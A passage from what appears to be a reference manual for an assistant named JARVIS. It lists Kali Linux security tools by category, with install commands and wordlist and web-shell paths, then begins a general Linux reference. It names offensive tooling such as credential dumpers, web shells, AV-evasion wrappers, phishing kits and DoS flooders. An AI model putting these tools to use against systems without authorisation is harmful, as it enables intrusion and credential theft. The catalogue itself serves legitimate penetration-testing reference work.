### 44.2 Vulnerability Analysis

`arachni` — web-app security scanner (daemon + CLI + web UI).
`bed` — simple generic application fuzzer.
`cisco-auditing-tool` — scans Cisco routers for common vulns/defaults.
`cisco-global-exploiter` — old Cisco exploits (CVE-era).
`cisco-ocs` — Cisco ISO scanner.
`cisco-torch` — Cisco fingerprinter/brute.
`doona` — modernized bed fuzzer fork.
`exploitdb` / `searchsploit` — offline copy of exploit-db; `searchsploit -t mysql 5.5`.
`flunym0us` — WordPress + Moodle vuln scanner.
`golismero` — pluggable web auditor.
`joomscan` — Joomla vuln scanner.
`legion` — automated network pentest GUI.
`lynis` — host-level security auditor (read-only hardening review).
`nessus` — Tenable commercial scanner (install separately).
`nikto` — HTTP vuln scanner (config/outdated versions/dangerous files).
`openvas` / `gvm` — FOSS vulnerability scanner (web UI + framework).
`rainbowcrack` — time-memory trade-off cracker.
`scap-workbench` — SCAP compliance scanner GUI.
`skipfish` — fast recursive web vuln scanner (Google).
`sqlmap` — SQL-injection automation.
`thc-ipv6` — IPv6 attack framework.
`tiger` — old-school Unix security auditor.
`unix-privesc-check` — Unix priv-esc enum script.
`w3af` / `w3af_gui` — web-app attack & audit framework.
`wapiti` — web-app vuln scanner.
`wfuzz` — web-app fuzzer; brute-force web content and parameters.
`wpscan` — WordPress scanner (users, plugins, CVEs, brute).
`xsser` — XSS finder/injector.

### 44.3 Web Application Analysis

`apache2` / `nginx` — local web servers (for hosting payload files).
`arjun` — hidden HTTP-parameter discovery.
`arachni` — web auditor (also §44.2).
`aren.rb` — ASP.NET view-state encoder/decoder.
`bdd-security` — behaviour-driven security testing for webapps.
`bettercap` — MITM framework (web + BT + wifi + …).
`burpsuite` — Portswigger intercepting proxy (community + pro).
`cadaver` — WebDAV client.
`cewl` — custom wordlist generator; scrapes a site.
`chromium` — headless Chromium for automation/scraping.
`clusterd` — app-server attacks (JBoss/Tomcat/Coldfusion/Weblogic).
`commix` — command-injection exploitation tool.
`crackmapexec` — now `nxc` (netexec); AD/SMB/MSSQL swiss army.
`crunch` — wordlist generator with char sets + masks.
`davtest` — WebDAV test tool.
`dbhunter` — wraps sqlmap + others for DB discovery (obscure).
`dirb` — classic dictionary-based directory brute.
`dirbuster` — Java GUI content brute (OWASP).
`dirsearch` — multi-threaded content brute; modern.
`dotdotpwn` — path-traversal fuzzer.
`dradis` — pentest reporting server.
`ettercap` — MITM suite (ARP, DNS, DHCP, filtering).
`eyewitness` — screenshotting tool for web/RDP at scale.
`feroxbuster` — fast recursive content brute in Rust.
`ffuf` — HTTP fuzzer (virt-host, params, content) — FFUF.
`fimap` — local/remote file inclusion scanner.
`gobuster` — dir/DNS/vhost brute in Go.
`hakrawler` — Go web crawler for URLs/endpoints.
`hydra` — online brute-force (also §44.5; covers web forms too).
`httprobe` — probe http/https on a list of hosts (tomnomnom).
`httpx` — HTTP toolkit (projectdiscovery); alive-check + metadata.
`httrack` — site mirror for offline analysis.
`jadx` — Android bytecode decompiler (also §44.7).
`joomscan` — Joomla scanner.
`jwt_tool` / `jwt-tool` — JWT testing + cracking.
`kadimus` — LFI exploitation.
`katana` — crawler from projectdiscovery.
`maltego` — GUI OSINT (also §44.1).
`medusa` — online brute-force.
`mitmproxy` — scriptable intercepting proxy.
`nikto` — HTTP vuln scanner.
`nmap` — web-aware NSE scripts (http-*, ssl-*).
`nosqlmap` — NoSQL injection.
`obscured` — obscures/encodes payloads.
`oscp-exam-tools` (not a binary) — metapackage grouping for OSCP.
`padbuster` — Padding-oracle attack tool.
`paros` — older Java proxy (superseded by ZAP/Burp).
`parsero` — scans robots.txt entries.
`patator` — multi-protocol brute forcer (Python).
`paramspider` — mines params from wayback / common-crawl.
`photon` — OSINT crawler to find endpoints + params.
`plecost` — WP plugin finger/fingerprinter.
`proxychains` / `proxychains4` — route any binary through proxies.
`proxychains-ng` — maintained fork.
`qsreplace` — replace query-string values from stdin (tomnomnom).
`recon-ng` — framework (also §44.1).
`rustscan` — fast-port-scanner wrapper around nmap in Rust.
`sqlmap` — SQLi tool.
`sqlninja` — MSSQL-targeted SQLi automation.
`sslyze` / `sslscan` — TLS config.
`subfinder` — subdomain finder (also §44.1).
`thc-ipv6` — IPv6 attack framework.
`uniscan` — web vuln scanner.
`w3af` — audit framework.
`wafw00f` — WAF detection.
`wappalyzer-cli` — tech stack id.
`wapiti` — web-app scanner.
`waybackurls` — URLs from Wayback Machine.
`webshells` / `laudanum` — web shell collections (/usr/share/webshells/).
`webslayer` — burp-like fuzzer (old).
`weevely` — PHP web-shell generator + client.
`whatweb` — fingerprinter.
`wfuzz` — fuzzer.
`wpscan` — WordPress scanner.
`xsrfprobe` — CSRF auditor.
`xsser` — XSS tool.
`xsstrike` — advanced XSS scanner.
`zaproxy` — OWASP ZAP.
`zap-cli` — python CLI around ZAP.

### 44.4 Database Assessment

`jsql-injection` — Java SQLi GUI.
`mdb-sql` — query MS-Access mdb/accdb files.
`mdbtools` — parse MS-Access files (mdb-tables, mdb-export).
`nosqlmap` — NoSQL injection.
`oscanner` — Oracle assessment framework.
`sidguesser` — Oracle SID brute.
`sqldict` — SQL dictionary attack (old).
`sqlmap` — the canonical SQLi tool.
`sqlninja` — targets MSSQL.
`sqlsus` — MySQL-focused injection exploiter.
`tnscmd10g` — Oracle TNS listener commands.

### 44.5 Password Attacks

`cewl` — custom wordlist generator from a URL.
`chntpw` — offline Windows SAM editor / password reset.
`cisco-auditing-tool` — Cisco default-password audit.
`crack` — original Unix password cracker (historical).
`crowbar` — RDP/VNC/SSH/OpenVPN brute (Python).
`crunch` — wordlist generator by length + charset.
`cupp` — "common user password profiler"; generates targeted lists.
`evil-winrm` — WinRM shell + creds brute.
`fcrackzip` — zip password cracker.
`freerdp-x11` — RDP client (not a cracker, but paired with crowbar).
`hash-identifier` — Python; identifies hash algorithm.
`hashcat` — GPU-accelerated hash cracker.
`hashdeep` — recursive hash with audit features.
`hashid` — hash-algo identifier (Ruby).
`hcxdumptool` — capture PMKID/EAPOL for hashcat.
`hcxpcapngtool` — convert PMKID cap to hashcat 22000 format.
`hydra` — online brute-force (SSH, FTP, HTTP, SMB, …).
`john` / `johnny` — John the Ripper; johnny is the Qt GUI.
`keepass2john` — extract hash from KeePass kdbx.
`maskprocessor` — mask-based wordlist generator.
`medusa` — parallel online brute-force.
`mimikatz` — Windows credential dumper (run via impacket or directly).
`ncrack` — high-speed network brute (nmap project).
`office2john` — extract hash from MS Office docs.
`ophcrack` — rainbow-table Windows LM/NTLM cracker (GUI).
`passing-the-hash` — metapackage for PtH tools.
`patator` — multi-protocol python brute-forcer.
`pdfcrack` — PDF password cracker.
`pipal` — password-list analyzer (base rules, lengths).
`pyrit` — WPA cracker (deprecated but still ships).
`rainbowcrack` — rainbow-table generator + cracker.
`rarcrack` — RAR archive cracker.
`rcracki-mt` — rainbow crack multi-threaded.
`rsmangler` — mangles wordlists for rules.
`samdump2` — dump Windows SAM hashes from registry hives.
`seclists` — huge collection of wordlists (/usr/share/seclists).
`ssh2john` — extract hash from SSH private key.
`statsprocessor` — statistics-driven wordlist generator.
`stegseek` — crack steghide jpegs.
`thc-pptp-bruter` — PPTP VPN brute.
`truecrack` — TrueCrypt volume cracker.
`twofi` — Twitter-based wordlist generator.
`wordlists` — meta-links (see /usr/share/wordlists).
`zip2john` — extract hash from password-protected zip.

### 44.6 Wireless Attacks

`aircrack-ng` suite: `airmon-ng`, `airbase-ng`, `aireplay-ng`, `airodump-ng`, `airtun-ng`, `ivstools`, `packetforge-ng`, `wesside-ng`, `easside-ng`.
`asleap` — LEAP/PPTP password cracker.
`bettercap` — modern MITM/wireless framework.
`bluelog` — Bluetooth device logger.
`bluemaho` — Bluetooth pen-test framework.
`blueranger` — Bluetooth device locator via signal strength.
`bluesnarfer` — old OBEX Bluetooth attack.
`bluetooth` — daemon/stack.
`bluez` — core Linux Bluetooth stack (bluetoothctl, hciconfig).
`btscanner` — Bluetooth scanner (curses UI).
`cowpatty` — WPA2-PSK brute-forcer (precomputed tables).
`crackle` — BLE encryption-key recovery.
`eapmd5pass` — EAP-MD5 cracker.
`fern-wifi-cracker` — GUI automation for WEP/WPA attacks.
`gerix-wifi-cracker` — wireless pentest GUI (older).
`giskismet` — aggregates kismet captures for GIS mapping.
`hcxdumptool` — PMKID/EAPOL capture.
`hcxkeys` — hashcat-compatible candidate generator.
`hcxpcapngtool` — pcap → hashcat 22000.
`hostapd-wpe` — WPA Enterprise rogue AP.
`kismet` — wireless detector/sniffer/IDS.
`macchanger` — MAC address changer.
`mdk3` / `mdk4` — wireless testing & DoS.
`mfoc` — MIFARE Classic brute.
`mfcuk` — MIFARE Classic Universal toolKit.
`mfterm` — MIFARE terminal.
`multimon-ng` — decode digital modes (POCSAG, FLEX, AFSK).
`nfcutils` — nfc-list, nfc-poll.
`pixiewps` — offline WPS PIN recovery.
`pyrit` — WPA cracker (GPU).
`reaver` — WPS attack tool.
`rfidiot` — RFID tools (Python).
`spectools` — Kismet spectrum-analyzer.
`spooftooph` — Bluetooth MAC spoof.
`ubertooth` — ubertooth-one BLE tools.
`wifi-honey` — rogue AP framework.
`wifiphisher` — automated rogue-AP phishing.
`wifite` — automated WEP/WPA/WPS attacks.

### 44.7 Reverse Engineering

`apktool` — Android APK disassembly + resource decoding.
`baksmali` / `smali` — Dalvik dis-/assembler.
`binary-ninja-free` — demo-level Binary Ninja.
`checksec` — ELF hardening report.
`cutter` — radare2 Qt GUI.
`dex2jar` — convert dex → jar.
`edb-debugger` — cross-platform GUI debugger.
`flasm` — Flash (SWF) assembler/disassembler.
`frida` — dynamic instrumentation toolkit (hooking iOS/Android/native).
`frida-tools` — CLI wrappers around frida.
`gdb` — GNU debugger.
`ghidra` — NSA RE framework (GUI + headless).
`jadx` / `jadx-gui` — Android bytecode decompiler to Java.
`javasnoop` — Java in-process debugger.
`jd-gui` — Java decompiler GUI.
`lldb` — LLVM debugger.
`nasm` / `yasm` — x86 assemblers.
`objdump` — binutils disassembler.
`one_gadget` — finds one-gadget RCE in libc.
`ollydbg` — older Windows debugger (via wine).
`pwndbg` — gdb exploit-dev plugin.
`pwntools` — exploit-writing Python library.
`radare2` / `r2` — CLI-first RE framework.
`rizin` — radare2 fork.
`rsatool` — RSA key toolkit.
`smalisca` — static analysis for smali.
`valgrind` — dynamic-analysis framework (memcheck, callgrind).
`volatility3` — memory forensics (also §44.11).
`yara` — pattern matcher for binaries/memory.
`zsteg` — PNG/BMP steganalysis.

### 44.8 Exploitation Tools

`armitage` — Metasploit GUI.
`beef-xss` / `beef` — browser exploitation framework.
`commix` — command injection.
`crackmapexec` / `nxc` — AD/SMB/MSSQL post-ex.
`dbeaver` — SQL client (for pivoting).
`evil-winrm` — WinRM shell.
`exploitdb` / `searchsploit` — exploit mirror.
`impacket-*` — Python suite: psexec, smbexec, wmiexec, ntlmrelayx, getuserspns, secretsdump, ticketer, smbserver, mssqlclient, kerberoast variants.
`jexboss` — JBoss / Java deserialization exploitation.
`metasploit-framework` — msfconsole, msfvenom, msfdb.
`pompem` — exploit aggregator search.
`powersploit` — PowerShell post-ex scripts (in /usr/share/windows-resources/).
`routersploit` — embedded/router exploitation framework.
`shellter` — Windows PE dynamic shellcode injector.
`sniffjoke` — TCP injection evasion.
`social-engineer-toolkit` / `setoolkit` — phishing/payload kit.
`thefatrat` — metasploit payload wrapper.
`veil` / `veil-evasion` — AV-evasion wrapper for payloads.
`webshells` — /usr/share/webshells/{php,asp,jsp,aspx}.
`yersinia` — L2 attacks (STP/CDP/DHCP/HSRP).

### 44.9 Sniffing & Spoofing

`bettercap` — modern MITM framework.
`bridge-utils` — classic bridge config (brctl).
`dhcpig` — DHCP exhaustion tool.
`dnschef` — DNS-proxy MITM.
`dns2tcp` — DNS tunneling.
`driftnet` — extracts images from captures.
`dsniff` — password sniffer + arpspoof/macof/sshmitm/webmitm (historic).
`ettercap-graphical` / `ettercap-text` — MITM suite.
`fragrouter` — fragment-based IDS evasion.
`hamster-sidejack` — replays Firesheep-style session hijacks.
`iaxflood` — IAX2 (VoIP) flooder.
`inviteflood` — SIP invite flooder.
`isr-evilgrade` — update-injection framework.
`macof` — MAC table flooder (forces switch → hub).
`mitm6` — IPv6 MITM against Windows.
`mitmproxy` — HTTPS MITM with scripting.
`nemesis` — packet injection tool.
`ngrep` — grep on packet payloads.
`ohrwurm` — RTP (VoIP) fuzzer.
`protos-sip` — SIP protocol testing.
`rebind` — DNS-rebinding attacks.
`responder` — LLMNR/NBT-NS/mDNS poisoner (Windows creds).
`rtpflood` — RTP flooder.
`scapy` — packet-crafting REPL.
`sctpscan` — SCTP port scanner.
`sipcrack` — SIP-auth cracker.
`sipp` — SIP load tester.
`sipvicious` — SIP auditing.
`siparmyknife` — SIP fuzzer.
`sniffjoke` — IDS evasion through TCP sniff/inject.
`ssh-mitm` — transparent SSH MITM.
`sslsplit` — transparent SSL/TLS MITM.
`sslstrip` — HTTPS stripper (historic).
`thc-ipv6` — IPv6 attack suite.
`voiphopper` — VoIP VLAN hopping.
`wifi-honey` — fake APs with 5 common cipher types.
`wireshark` / `tshark` — sniffer + analyzer.
`yersinia` — L2 attacks.

### 44.10 Post-Exploitation

`backdoor-factory` — bind a shellcode to an existing PE/ELF.
`bind-shell` / `reverse-shell` snippets — see /usr/share/webshells and /usr/share/seclists/Payloads/.
`bloodhound` — AD attack-path graphing (Neo4j + GUI).
`bloodhound-python` — BloodHound collector in python.
`sharphound` — BloodHound collector (C#, .NET).
`cryptcat` — netcat w/ encryption.
`cymothoa` — injects shellcode into running processes.
`dbd` — encrypted netcat alternative.
`dns2tcpc` / `dns2tcpd` — DNS tunnel.
`enum4linux(-ng)` — SMB enumeration.
`evil-winrm` — WinRM shell.
`exe2hex` — convert binaries to hex for transfer.
`hyperion` — PE crypter.
`impacket` suite — smbexec/psexec/wmiexec/mssqlclient/secretsdump/ticketer.
`inundator` — IDS/IPS/WAF stress-tester.
`iodine` — IP-over-DNS tunnel.
`jd-gui` — Java decompiler (for cred hunting in jars).
`laudanum` — web shells.
`mimikatz` — Windows cred dumper.
`msfpc` — msfvenom payload-creator wrapper.
`neighbor-cache-fingerprinter` — ARP/NDP fingerprint tool.
`nishang` — PowerShell post-ex framework.
`pivotsuite` — pivoting helpers (SSH/HTTP/DNS).
`powersploit` — PowerShell framework.
`proxychains4` — proxy any binary.
`pyinstaller` — turn python into standalone exe (payload packaging).
`pypykatz` — pure-python mimikatz.
`ridenum` — Windows SID enumerator.
`smbmap` — SMB share mapping.
`ssf` — secure socket funneling (tunneling).
`stunnel` — TLS wrapper around arbitrary protocols.
`thc-ipv6` — IPv6 post-ex angles.
`udptunnel` — UDP tunnel.
`weevely` — PHP shell generator & controller.
`windows-binaries` — /usr/share/windows-resources has mimikatz, wce, fgdump, nc.exe, plink.exe…
`windows-exploit-suggester` — suggests exploits from systeminfo output.
`wmis` — Windows management via SMB (cifs-utils).
`xinetd` — superserver for spawning listener shells.

### 44.11 Forensics

`afflib-tools` — AFF forensics-image tools.
`apktool` — APK static analysis (also §44.7).
`autopsy` — GUI frontend to Sleuth Kit.
`binwalk` — firmware analysis + carving.
`bulk-extractor` — artifact extraction at scale (emails, URLs, SSNs).
`cabextract` — Microsoft Cabinet (.cab) extractor.
`capstone` — disassembly framework.
`chainsaw` — Sigma-rule based EVTX hunter (Rust).
`chntpw` — Windows SAM editor.
`chrootkit` — rootkit detector.
`clamav` / `clamscan` — AV engine.
`cuckoo` — malware sandbox.
`dc3dd` — `dd` with hashing/logging.
`dcfldd` — same idea, older.
`ddrescue` — imaging tool resilient to bad sectors.
`dff` — Digital Forensics Framework.
`dumpzilla` — extracts Firefox/Chromium/Edge profile forensics.
`evtxtract` — extract records from corrupted Windows evtx.
`exiftool` — EXIF and metadata.
`ext3grep` — ext3 deleted-file recovery.
`ext4magic` — ext4 deleted-file recovery.
`extundelete` — similar.
`foremost` — file carving.
`forensics-all` — metapackage.
`galleta` — IE cookie parser.
`grokevt` — Windows event log parser.
`guymager` — GUI imaging tool.
`hashdeep` — hash auditing.
`hayabusa` — EVTX analyzer (Sigma/kusto).
`hfsprogs` — HFS+ utilities.
`libewf` — E01 imaging library + tools (ewfacquire/ewfmount/ewfinfo).
`log2timeline` / `plaso` — timeline creation from artifacts.
`lsof` — open file descriptors.
`lynis` — system audit.
`magicrescue` — file carving by signature.
`md5deep` — recursive hashing.
`missidentify` — spots files with wrong extensions.
`myrescue` — dd alternative skipping errors.
`nasty` — extract useful things from /proc (e.g. crypto keys).
`ntfsprogs` — NTFS tools (ntfsfix, ntfscat, ntfsls).
`oletools` — parse OLE files (msoffice, oledump, olevba).
`outguess` — steganography.
`p7zip-full` — 7zip.
`pasco` — IE history parser.
`pdfid`, `pdf-parser`, `peepdf` — PDF triage.
`photorec` — carve images from media.
`plaso` — super-timeline (log2timeline + psteal).
`pst-utils` — Microsoft PST/OST parsers (readpst).
`rdd` — diagnostic dd.
`recoverjpeg` — JPEG carver.
`regripper` — Windows registry parser.
`reglookup` — raw Windows registry utility.
`rifiuti` / `rifiuti2` — Recycle Bin parsers.
`rkhunter` — rootkit hunter.
`samdump2` — SAM hash dumper.
`scalpel` — file carving (foremost sibling).
`scrounge-ntfs` — NTFS data rescuer.
`sleuthkit` — tsk_* utilities (fls, fsstat, icat, mmls, mactime).
`ssdeep` — fuzzy hashing (approximate match).
`steghide` — steganography (JPG/BMP/WAV).
`stegsnow` — whitespace stego.
`testdisk` — partition recovery + photorec's parent.
`tsk-gui` — Sleuth Kit GUI.
`undbx` — Outlook Express .dbx parser.
`vinetto` — Windows Thumbs.db parser.
`volatility3` — modern memory forensics.
`volatility-tools` — plugins for vol2.
`wipe` — secure erase.
`xmount` — remount images as local file.
`yara` — pattern matcher.

### 44.12 Reporting Tools

`cherrytree` — hierarchical notebook (SQLite).
`cutycapt` — capture WebKit rendering to image/PDF.
`dradis` — collaborative pentest reporting.
`eyewitness` — URL/RDP screenshotter at scale.
`faraday` — multi-user pentest platform.
`keepnote` — older notebook (unmaintained).
`magictree` — tree-based pentest org (Java).
`maltego` — GUI OSINT / graphing.
`metagoofil` — public doc harvester (also §44.1).
`pipal` — password-list analyzer.
`pwndoc` — modern pentest reporting (Docker).
`pwndoc-ng` — maintained fork.
`recordmydesktop` — screen recording.
`serpico` — report-templating tool.

### 44.13 Social Engineering Tools

`gophish` — phishing framework with tracking (GUI/API).
`king-phisher` — phishing-campaign toolkit.
`maltego` — OSINT GUI.
`msfpc` — payload-creator wrapper.
`set` / `setoolkit` — social-engineering toolkit.
`tuxdb` — ads from phishing emails analysis (niche).
`wifiphisher` — AP-based credential phishing.

### 44.14 System Services (launched as daemons)

`apache2` — LAMP web server.
`bluetooth` — Bluetooth daemon.
`cups` — printing system.
`dbus` — IPC daemon.
`dnsmasq` — small DHCP+DNS forwarder; useful for rogue networks.
`docker.io` / `docker` — container daemon.
`haveged` — entropy daemon (useful in VMs).
`isc-dhcp-server` — full DHCP server.
`nginx` — high-perf web server.
`openbsd-inetd` — classic inetd.
`openssh-server` — sshd.
`openvpn` — OpenVPN daemon.
`postgresql` — DB (msf uses it).
`proftpd` — FTP server.
`rsync` — rsync daemon (rsyncd).
`snmpd` — net-snmp daemon.
`tor` — Tor daemon.
`vsftpd` — FTP server (very secure).
`xrdp` — RDP server for Linux.

### 44.15 Hardware Hacking

`apktool` — APK dis.
`arduino` — Arduino IDE/toolchain.
`avrdude` — programs AVR chips (Arduino microcontrollers).
`binwalk` — firmware analysis.
`dex2jar` — dex → jar.
`ghidra` — RE framework.
`gqrx` — SDR spectrum + demod GUI.
`gr-osmosdr` — gnuradio drivers for SDR dongles.
`gnuradio` — DSP framework.
`hackrf` — HackRF tools (hackrf_transfer, hackrf_sweep).
`i2c-tools` — i2cdetect, i2cdump, i2cset/get.
`jtagulator` — wraps JTAGulator serial interface.
`minicom` — serial terminal.
`rtl-sdr` — cheap SDR tools (rtl_tcp, rtl_fm, rtl_power).
`rfcat` — TI CC1111 RF attack framework.
`screen` — serial console wrapper.
`smartcard` — pcsc-tools (pcsc_scan, scriptor).
`socat` — multipurpose relay (TCP↔serial, etc.).
`spi-tools` — SPI userspace tools.
`uart-control` — scripts for UART exploration.
`urjtag` — JTAG tool.
`usbrip` — forensic USB plug-in log parser.

### 44.16 Mobile & Android

`adb` / `android-tools-adb` — Android Debug Bridge.
`apkleaks` — secret scanning in APKs.
`apktool` — disassembler.
`bytecode-viewer` — combined Java/Android decompilers.
`checkra1n` / `palera1n` — iOS jailbreaks (project-specific, sometimes shipped).
`class-dump` — Objective-C runtime dumper.
`dex2jar` — DEX → JAR.
`diva-android` — intentionally vulnerable Android app (training).
`drozer` — Android security framework.
`fastboot` — Android fastboot protocol tool.
`frida` / `frida-tools` — dynamic instrumentation.
`heimdall` — Samsung Odin alternative (flasher).
`jadx` — decompile Android to Java.
`mobsf` — Mobile Security Framework (web UI; often via Docker).
`needle` — iOS pen-testing framework.
`objection` — runtime mobile exploration (built on frida).
`opencv-data` — OpenCV models (used by some mobile forensics).
`smali` / `baksmali` — DEX assembler/disassembler.

### 44.17 Stress / DoS (use only on assets you own)

`dhcpig` — DHCP exhaustion.
`gohping` — hping-like in Go.
`hping3` — custom flood + SYN flood.
`iaxflood` — IAX2 flood.
`inviteflood` — SIP INVITE flood.
`macof` — MAC table flood.
`medusa-proxy` — generic proxy flood wrapper.
`reaver` — WPS brute (causes AP stress).
`rtpflood` — RTP flood.
`slowhttptest` — slow HTTP dos (Slowloris-style).
`t50` — multi-protocol packet injector.
`thc-ssl-dos` — SSL renegotiation DoS.

### 44.18 CMS / Framework Scanners

`cmsmap` — CMS scanner (WP/Joomla/Drupal).
`cmseek` — another CMS scanner.
`droopescan` — Drupal/Silverstripe/WordPress.
`joomscan` — Joomla.
`plecost` — WP plugins.
`wpscan` — WordPress (the standard).

### 44.19 VoIP

`enumiax` — IAX2 username enum.
`iaxflood` / `inviteflood` / `rtpflood` — flooders.
`protos-sip` — SIP testing.
`rtpbreak` — RTP stream reconstruction.
`rtpinsertsound` / `rtpmixsound` — inject audio into live RTP.
`sctpscan` — SCTP scanner.
`sipp` — SIP load generator.
`sipsak` — SIP "swiss army knife".
`sipvicious` (svmap/svwar/svcrack) — SIP audit.
`voiphopper` — VLAN hopping.

### 44.20 Miscellaneous / top-picked

`alien` — convert rpm ↔ deb.
`ansible` — config mgmt (Ansible). Useful when pivoting to infra.
`apache-users` — enumerate Apache ~user dirs.
`apt-transport-tor` — route apt through Tor.
`aptitude` — TUI for apt.
`arch-install-scripts` — useful if rescuing an Arch box.
`bsdtar` — tar alternative (bundled with libarchive).
`buildbot` — CI runner — sometimes handy in lab.
`cabextract` — .cab files.
`cups-pk-helper` — print dialogs.
`dialog` / `whiptail` — curses UI for shell scripts.
`docker.io` — Docker.
`duc` — disk-usage indexer + web UI.
`duf` — nicer `df`.
`exa` / `eza` — modern `ls`.
`fzf` — fuzzy finder; pipe anything into it.
`glow` — terminal markdown renderer.
`jq` — JSON processor.
`khal` — CLI calendar (CalDAV).
`mc` — Midnight Commander (dual-pane file manager).
`moreutils` — ts, sponge, vidir, chronic, pee.
`mosh` — SSH replacement that survives network drops.
`neofetch` / `fastfetch` — pretty system info.
`neovim` — editor.
`nnn` — TUI file manager.
`pwgen` — random password generator.
`ranger` — TUI file manager.
`rclone` — cloud-storage sync (S3, Drive, Dropbox, …).
`rlwrap` — adds readline to any REPL.
`screen` / `tmux` — session multiplexers.
`sshfs` — mount remote dir via SSH.
`stow` — symlink manager for dotfiles.
`sshuttle` — poor-man's VPN over SSH.
`tldr` — simplified man pages.
`trash-cli` — `trash-put` instead of rm.
`yq` — YAML equivalent of jq.
`zoxide` — smarter `cd` via frecency.

### 44.21 Tool-lookup tricks

```
apt search <keyword>                       # catalog search
apt-cache search <keyword>
apt show <pkg> | less
dpkg -L <pkg>                              # what files the pkg provides
dpkg -S /path                              # which pkg provides this file
apt-file search <path>                     # requires: sudo apt-file update
apt-cache depends <pkg>                    # depends / recommends
command -v <cmd>                           # resolve binary path
type <cmd>                                 # shell alias / fn / binary?
locate <filename>                          # via mlocate db (run `updatedb` first)
whereis <cmd>                              # binary + man + source
tldr <cmd>                                 # quick usage
man -k <topic>                             # apropos: man-page keyword search
```

### 44.22 "Install more" metapackages

Kali offers category metapackages. Install the whole category in one go:
```
sudo apt install kali-tools-information-gathering
sudo apt install kali-tools-vulnerability
sudo apt install kali-tools-web
sudo apt install kali-tools-database
sudo apt install kali-tools-passwords
sudo apt install kali-tools-wireless
sudo apt install kali-tools-reverse-engineering
sudo apt install kali-tools-exploitation
sudo apt install kali-tools-sniffing-spoofing
sudo apt install kali-tools-post-exploitation
sudo apt install kali-tools-forensics
sudo apt install kali-tools-reporting
sudo apt install kali-tools-social-engineering
sudo apt install kali-tools-system-services
sudo apt install kali-tools-hardware
sudo apt install kali-tools-mobile
sudo apt install kali-tools-voip
sudo apt install kali-tools-top10                # the 10 most-used
sudo apt install kali-tools-default              # what the live ISO has
sudo apt install kali-tools-everything           # EVERYTHING (~15 GB)
sudo apt install kali-linux-headless             # no GUI, just tools
```

### 44.23 Wordlists & content

```
/usr/share/wordlists/          → symlinks and raw lists
    rockyou.txt.gz             → CLASSIC; gunzip before use
    metasploit/                → msf-bundled lists
    dirb/                      → content-discovery
    dirbuster/                 → content-discovery
    wfuzz/                     → wfuzz patterns
/usr/share/seclists/           → big curated collection
    Passwords/
    Discovery/Web-Content/
    Usernames/
    Fuzzing/
    Payloads/
/usr/share/webshells/          → PHP, ASP, JSP, ASPX shells
/usr/share/windows-resources/  → mimikatz, nc.exe, plink.exe, wce, fgdump
/usr/share/payloads/           → metasploit payloads
```

### 44.24 Quick "what's available right now?" check

```
apropos <topic>                # e.g. apropos "sql injection"
compgen -c | grep -i <term>    # installed commands matching term
dpkg -l | awk '{print $2}' | grep -i <term>
# Category catalog:
apt-cache search ^kali-tools-   # list category metapackages
```

---

## 45. Linux — distro-agnostic deep reference

The previous sections are Kali/XFCE-flavored. This section is the Linux platform itself: kernel, boot, init, filesystems, shells, packaging across distros, user-space fundamentals. If JARVIS is asked about a non-Kali machine, this is the knowledge to reach for.

### 45.1 Kernel essentials

```
uname -r                        # kernel release (6.x.y-…)
uname -a                        # full info
cat /proc/version               # kernel build info
cat /proc/cmdline               # kernel boot parameters
cat /proc/modules               # loaded modules
lsmod                           # same, prettier
modinfo <mod>                   # module details (author, license, params)
modprobe <mod>                  # load a module (resolves deps)
modprobe -r <mod>               # unload
rmmod <mod>                     # unload (no dep check)
insmod /path/foo.ko             # load from file
depmod -a                       # rebuild module-dep map
cat /etc/modules                # modules auto-loaded at boot
ls /etc/modules-load.d/         # modern systemd-managed auto-load
ls /etc/modprobe.d/             # module options + blacklists
```

### 45.2 Boot process (BIOS/UEFI → kernel → userspace)

```
1. Firmware (BIOS or UEFI) POSTs hardware.
2. Firmware loads boot loader from ESP (/boot/efi) or MBR.
3. Boot loader (GRUB, systemd-boot, rEFInd, syslinux) loads:
     - kernel (vmlinuz-*)
     - initramfs (initrd.img-*, initramfs-*)
     - kernel cmdline (root=UUID=…, ro, quiet, splash, …)
4. Kernel unpacks initramfs into tmpfs, runs /init inside it.
5. initramfs loads block/fs/keymap modules, mounts the real rootfs,
   switch_root pivots into it.
6. Kernel execs /sbin/init (or whatever init= points at) — usually
   systemd these days.
7. init/systemd starts services until graphical.target (or the
   configured default target).
```

### 45.3 Init systems

systemd dominates (Debian/Kali/Ubuntu/Fedora/Arch), but you may meet others.

```
# Which init is pid 1?
ls -l /sbin/init                        # symlink reveals it
cat /proc/1/comm                        # "systemd", "init", "openrc-init", "runit", …
ps -p 1                                 # prints cmdline of pid 1
```

- **systemd** — unit files in /lib/systemd/system + /etc/systemd/system; see §28.
- **SysV init** — /etc/init.d/ scripts, /etc/rc*.d/ symlinks. Control: `service <n> start|stop|restart`.
- **OpenRC** (Alpine, Gentoo) — /etc/init.d/ scripts. Control: `rc-service <n> start; rc-update add <n> default`.
- **runit** (Void) — /etc/sv/<svc>/ directories + `sv up <svc>`; services enabled by symlinking into /var/service/.
- **s6** (obscure) — similar to runit.
- **Upstart** — legacy Ubuntu (<15.04).

### 45.4 Filesystem Hierarchy Standard (FHS)

```
/            root
├── bin      essential user binaries (on many distros → /usr/bin)
├── sbin     essential system binaries (→ /usr/sbin)
├── boot     kernel, initramfs, boot-loader
├── dev      device nodes (devtmpfs)
├── etc      system config
├── home     user homes
├── lib      essential shared libs (→ /usr/lib)
├── media    removable-media mountpoints
├── mnt      temporary mountpoints
├── opt      third-party packages
├── proc     kernel / process virtual fs
├── root     root user's home
├── run      tmpfs: PID files, sockets (replaces /var/run)
├── sbin     essential system binaries
├── srv      service-served data (http, ftp)
├── sys      kernel device tree + tunables
├── tmp      world-writable scratch
├── usr      "unix system resources"
│   ├── bin   non-essential user binaries
│   ├── sbin  non-essential system binaries
│   ├── lib   libraries
│   ├── local user-installed software (not managed by pkg)
│   ├── share arch-independent data (docs, locale, man pages)
│   └── src   source code
└── var      variable data
    ├── cache  cached files
    ├── log    logs
    ├── spool  queued work (mail, print, cron)
    ├── tmp    tmp that persists across reboot
    └── lib    persistent variable state
```

Modern trend: `/usr`-merge — /bin → /usr/bin, /lib → /usr/lib, etc. Debian 12+, Fedora, Arch all merged.

### 45.5 Shells — bash, zsh, fish, sh

#### Choose / check shell
```
echo $SHELL                     # user's default
getent passwd $USER             # actually what's set in /etc/passwd
chsh -s /usr/bin/zsh            # change default shell
cat /etc/shells                 # allowed login shells
```

#### bash vs zsh key differences
- Arrays in zsh are 1-indexed by default; 0-indexed in bash (zsh can opt in with `setopt KSH_ARRAYS`).
- zsh globbing is way more powerful (`**/*.txt` recursive, qualifiers like `.` for regular files).
